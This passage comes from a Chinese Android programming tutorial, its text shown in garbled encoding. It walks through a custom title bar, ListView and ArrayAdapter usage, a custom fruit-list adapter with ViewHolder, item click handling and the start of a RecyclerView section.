alt="image-20240719152219494"></p><p>ä¿®æ”¹activity_main.xmlä¸­ä»£ç ï¼Œæ·»åŠ å¦‚ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;include <span class="attribute">layout</span>=<span class="string">&quot;@layout/title&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>åŒæ—¶å°†ç³»ç»Ÿè‡ªå¸¦çš„æ ‡é¢˜æ éšè—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    ActionBar actionBar=getSupportActionBar();</span><br><span class="line">    <span class="keyword">if</span>(actionBar!=<span class="literal">null</span>)&#123;</span><br><span class="line">        actionBar.hide();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è‡ªå®šä¹‰æ§ä»¶-2">è‡ªå®šä¹‰æ§ä»¶</h4><p>è‡ªå®šä¹‰æ§ä»¶å®ç°ä¸Šé¢ä¸¤ä¸ªButtonåŠŸèƒ½ï¼Œä½¿ä¸åŒæ´»åŠ¨ç‚¹å‡»è¿™ä¸¤ä¸ªæŒ‰é’®æ—¶ï¼Œåˆ†åˆ«å®ç°å„è‡ªåŠŸèƒ½ï¼Œä¸ç”¨ç¼–å†™å¤šæ¬¡</p><p>æ–°å»ºç±»TitleLayoutï¼Œç»§æ‰¿LinearLayout,è®©ä»–æˆä¸ºè‡ªå®šä¹‰æ ‡é¢˜æ æ§ä»¶,å¹¶æ³¨å†ŒæŒ‰é’®ç‚¹å‡»äº‹ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TitleLayout</span> <span class="keyword">extends</span> <span class="title class_">LinearLayout</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TitleLayout</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context, attrs);</span><br><span class="line">        LayoutInflater.from(context).inflate(R.layout.title,<span class="built_in">this</span>);</span><br><span class="line">        Button titleBack=findViewById(R.id.title_back);</span><br><span class="line">        Button titleEdit=findViewById(R.id.title_edit);</span><br><span class="line">        titleBack.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                ((Activity)getContext()).finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        titleEdit.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                Toast.makeText(getContext(), <span class="string">&quot;You click Edit&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼šåœ¨æ§ä»¶ä¸­ä½¿ç”¨TitleLayoutæ§ä»¶å°±ä¼šè°ƒç”¨æ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°ä¸­å¯¹æ ‡é¢˜æ å¸ƒå±€è¿›è¡ŒåŠ¨æ€åŠ è½½ï¼Œè¿›è€Œç»‘å®šæŒ‰é’®</p><p>inflate()å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªæ˜¯åŠ è½½çš„å¸ƒå±€idï¼Œç¬¬äºŒä¸ªæ˜¯çˆ¶å¸ƒå±€</p><p>åŒæ—¶ä¿®æ”¹activity_main.xmlï¼Œå¸ƒå±€æ–‡ä»¶ä¸­æ·»åŠ è‡ªå®šä¹‰æ§ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.example.uicustomviews.TitleLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ListView">ListView</h3><h4 id="ListViewçš„ç®€å•ç”¨æ³•">ListViewçš„ç®€å•ç”¨æ³•</h4><p>å¸ƒå±€æ–‡ä»¶å¦‚ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ListView</span><br><span class="line">    android:<span class="attribute">id</span>=<span class="string">&quot;@+id/list_view&quot;</span></span><br><span class="line">    android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">    android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>ä»£ç å®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String[] data=&#123;<span class="string">&quot;Apple&quot;</span>,<span class="string">&quot;Banana&quot;</span>,<span class="string">&quot;Orange&quot;</span>,<span class="string">&quot;Watermelon&quot;</span>,<span class="string">&quot;Pear&quot;</span>,<span class="string">&quot;Grape&quot;</span>,<span class="string">&quot;Pineapple&quot;</span>,<span class="string">&quot;Strawberry&quot;</span>,<span class="string">&quot;Cherry&quot;</span>,<span class="string">&quot;Mango&quot;</span>,            <span class="string">&quot;Apple&quot;</span>,<span class="string">&quot;Banana&quot;</span>,<span class="string">&quot;Orange&quot;</span>,<span class="string">&quot;Watermelon&quot;</span>,<span class="string">&quot;Pear&quot;</span>,<span class="string">&quot;Grape&quot;</span>,<span class="string">&quot;Pineapple&quot;</span>,<span class="string">&quot;Strawberry&quot;</span>,<span class="string">&quot;Cherry&quot;</span>,<span class="string">&quot;Mango&quot;</span>&#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> <span class="title class_">ArrayAdapter</span>&lt;String&gt;(MainActivity.<span class="built_in">this</span>, android.R.layout.simple_list_item_1,data);</span><br><span class="line">        <span class="type">ListView</span> <span class="variable">listview</span> <span class="operator">=</span> findViewById(R.id.list_view);</span><br><span class="line">        listview.setAdapter(adapter);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å€ŸåŠ©ArrayAdapteré€‚é…å™¨å®ç°ç±»ï¼Œä¼ å…¥æ³›å‹Stringï¼Œ</p><p><code>android.R.layout.simple_list_item_1</code>ä¸ºListViewçš„å­é¡¹å¸ƒå±€idï¼Œç³»ç»Ÿå†…ç½®çš„ç”¨äºç®€å•æ˜¾ç¤ºä¸€æ®µæ–‡æœ¬ã€‚</p><p>æœ‰äº†Adpterå¯¹è±¡ï¼Œç”¨setAdapteræ–¹æ³•å°†æ„å»ºå¥½çš„é€‚é…å™¨å¯¹è±¡ä¼ é€’è¿›å»ï¼ŒListViewå’Œæ•°æ®ä¹‹é—´å…³è”å°±å»ºç«‹å®Œæˆã€‚</p><h4 id="å®šåˆ¶ListViewçš„ç•Œé¢">å®šåˆ¶ListViewçš„ç•Œé¢</h4><p>å®ç° æ˜¾ç¤ºæ°´æœå›¾ç‰‡ï¼Œæ—è¾¹æ˜¯æ°´æœçš„åå­—</p><p>å®šä¹‰ç±»ï¼Œä½œä¸ºListViewé€‚é…å™¨é€‚é…ç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> imageId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fruit</span><span class="params">(String name,<span class="type">int</span> imageId)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.imageId=imageId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getImageId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> imageId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡ªå®šä¹‰å­é¡¹å¸ƒå±€</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_image&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_vertical&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">&quot;10dp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è‡ªå®šä¹‰é€‚é…å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FruitAdapter</span> <span class="keyword">extends</span> <span class="title class_">ArrayAdapter</span>&lt;Fruit&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> resourceId;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FruitAdapter</span><span class="params">(Context context, <span class="type">int</span> textViewResourceId,</span></span><br><span class="line"><span class="params">                        List&lt;Fruit&gt; objects)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context, textViewResourceId, objects);</span><br><span class="line">        resourceId = textViewResourceId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">getView</span><span class="params">(<span class="type">int</span> position, View convertView, ViewGroup parent)</span> &#123;</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> getItem(position); <span class="comment">// è·å–å½“å‰é¡¹çš„Fruitå®ä¾‹</span></span><br><span class="line">   </span><br><span class="line">            <span class="type">View</span> <span class="variable">view</span> <span class="operator">=</span> LayoutInflater.from(getContext()).inflate(resourceId, parent, <span class="literal">false</span>); <span class="comment">//åŠ è½½å­é¡¹å¸ƒå±€</span></span><br><span class="line">        ImageView friutImage=(ImageView) view.findViewById (R.id.fruit_image);</span><br><span class="line">          TextView fruitName=(TextView) view.findViewById (R.id.fruit_name);</span><br><span class="line">            fruitImage.setImageResource(fruit.getImageId());</span><br><span class="line">            fruitName.setText(fruit.getName());     </span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è§£æé€‚é…å™¨</strong>ï¼šFruitApateræ„é€ æ–¹æ³•ï¼Œå°†ä¸Šä¸‹æ–‡ï¼Œå­é¡¹å¸ƒå±€IDï¼Œæ•°æ®ä¼ é€’è¿›æ¥</p><p>é‡å†™getViewæ–¹æ³•ï¼Œå½“æ¯ä¸ªå­é¡¹æ»šåŠ¨åˆ°ç•Œé¢å†…å°±ä¼šè°ƒç”¨</p><p><strong>MainActivity</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; fruitList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Fruit&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits(); <span class="comment">// åˆå§‹åŒ–æ°´æœæ•°æ®</span></span><br><span class="line">        <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(MainActivity.<span class="built_in">this</span>, R.layout.fruit_item, fruitList);</span><br><span class="line">        <span class="type">ListView</span> <span class="variable">listView</span> <span class="operator">=</span> (ListView) findViewById(R.id.list_view);</span><br><span class="line">        listView.setAdapter(adapter);</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initFruits</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">apple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Apple&quot;</span>, R.drawable.apple_pic);</span><br><span class="line">            fruitList.add(apple);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">banana</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Banana&quot;</span>, R.drawable.banana_pic);</span><br><span class="line">            fruitList.add(banana);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">orange</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Orange&quot;</span>, R.drawable.orange_pic);</span><br><span class="line">            fruitList.add(orange);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">watermelon</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Watermelon&quot;</span>, R.drawable.watermelon_pic);</span><br><span class="line">            fruitList.add(watermelon);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">pear</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Pear&quot;</span>, R.drawable.pear_pic);</span><br><span class="line">            fruitList.add(pear);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">grape</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Grape&quot;</span>, R.drawable.grape_pic);</span><br><span class="line">            fruitList.add(grape);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">pineapple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Pineapple&quot;</span>, R.drawable.pineapple_pic);</span><br><span class="line">            fruitList.add(pineapple);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">strawberry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Strawberry&quot;</span>, R.drawable.strawberry_pic);</span><br><span class="line">            fruitList.add(strawberry);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">cherry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Cherry&quot;</span>, R.drawable.cherry_pic);</span><br><span class="line">            fruitList.add(cherry);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">mango</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Mango&quot;</span>, R.drawable.mango_pic);</span><br><span class="line">            fruitList.add(mango);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æå‡æ•ˆç‡</strong></p><p>getViewè¿˜æœ‰ä¸€ä¸ªå‚æ•°convertViewï¼Œç”¨äºå°†ä¹‹å‰åŠ è½½çš„å¸ƒå±€è¿›è¡Œç¼“å­˜ï¼Œä»¥ä¾¿åé¢å¤ç”¨ã€‚</p><p>ä½†æ˜¯æ¯æ¬¡è¿˜åœ¨findViewById()æ–¹æ³•ã€‚å€ŸåŠ©ViewHolder</p><p>ä¿®æ”¹FruitAdapterä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.listviewtest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.view.LayoutInflater;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> android.widget.ArrayAdapter;</span><br><span class="line"><span class="keyword">import</span> android.widget.ImageView;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> android.widget.ArrayAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FruitAdapter</span> <span class="keyword">extends</span> <span class="title class_">ArrayAdapter</span>&lt;Fruit&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">getView</span><span class="params">(<span class="type">int</span> position, View convertView, ViewGroup parent)</span> &#123;</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> getItem(position); <span class="comment">// è·å–å½“å‰é¡¹çš„Fruitå®ä¾‹</span></span><br><span class="line">        View view;</span><br><span class="line">        ViewHolder viewHolder;</span><br><span class="line">        <span class="keyword">if</span> (convertView == <span class="literal">null</span>) &#123;</span><br><span class="line">            view = LayoutInflater.from(getContext()).inflate(resourceId, parent, <span class="literal">false</span>);</span><br><span class="line">            viewHolder = <span class="keyword">new</span> <span class="title class_">ViewHolder</span>();</span><br><span class="line">            viewHolder.fruitImage = (ImageView) view.findViewById (R.id.fruit_image);</span><br><span class="line">            viewHolder.fruitName = (TextView) view.findViewById (R.id.fruit_name);</span><br><span class="line">            view.setTag(viewHolder); <span class="comment">// å°†ViewHolderå­˜å‚¨åœ¨Viewä¸­</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            view = convertView;</span><br><span class="line">            viewHolder = (ViewHolder) view.getTag(); <span class="comment">// é‡æ–°è·å–ViewHolder</span></span><br><span class="line">        &#125;</span><br><span class="line">        viewHolder.fruitImage.setImageResource(fruit.getImageId());</span><br><span class="line">        viewHolder.fruitName.setText(fruit.getName());</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ViewHolder</span> &#123;</span><br><span class="line"></span><br><span class="line">        ImageView fruitImage;</span><br><span class="line">        TextView fruitName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>ListViewç‚¹å‡»äº‹ä»¶</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits(); <span class="comment">// åˆå§‹åŒ–æ°´æœæ•°æ®</span></span><br><span class="line">        <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(MainActivity.<span class="built_in">this</span>, R.layout.fruit_item, fruitList);</span><br><span class="line">        <span class="type">ListView</span> <span class="variable">listView</span> <span class="operator">=</span> (ListView) findViewById(R.id.list_view);</span><br><span class="line">        listView.setAdapter(adapter);</span><br><span class="line">        listView.setOnItemClickListener(<span class="keyword">new</span> <span class="title class_">AdapterView</span>.OnItemClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onItemClick</span><span class="params">(AdapterView&lt;?&gt; parent, View view,</span></span><br><span class="line"><span class="params">                                    <span class="type">int</span> position, <span class="type">long</span> id)</span> &#123;</span><br><span class="line">                <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> fruitList.get(position);</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, fruit.getName(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="RecyclerView">RecyclerView</h3><p>ä¸€ä¸ªå¢å¼ºç‰ˆçš„ListViewï¼Œå¯ä»¥å®ç°å’ŒListViewåŒæ ·çš„æ•ˆæœï¼Œè¿˜ä¼˜åŒ–ListViewä¸­çš„ä¸è¶³ã€‚</p><p>å®ç°å’Œä¸Šé¢ListViewåŒæ ·åŠŸèƒ½</p><p>activity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;androidx.recyclerview.widget.RecyclerView</span><br><span class="line">     android:<span class="attribute">id</span>=<span class="string">&quot;@+id/recycler_view&quot;</span></span><br><span class="line">     android:<span class="attribute">layout_width</span>=<span 